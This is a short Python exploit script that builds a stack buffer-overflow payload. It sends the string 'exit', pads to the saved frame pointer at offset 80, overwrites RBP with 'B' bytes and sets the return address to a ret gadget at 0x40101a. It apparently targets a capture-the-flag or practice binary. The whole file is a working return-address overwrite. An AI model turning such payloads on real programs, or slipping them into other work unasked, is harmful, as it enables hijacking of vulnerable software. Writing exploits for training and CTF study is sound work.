#!/usr/bin/env python3
import sys
from struct import pack
buf = b"exit"
buf += b"A" * (80 - len(buf))          # fill up to saved RBP at offset 80
buf += b"B" * 8                          # saved RBP = all nonzero 'BBBBBBBB'  (offset 80..88)
buf += pack("<Q", 0x0040101a)            # RIP = ret gadget (offset 88..96); trailing nulls
sys.stdout.buffer.write(buf + b"\n")
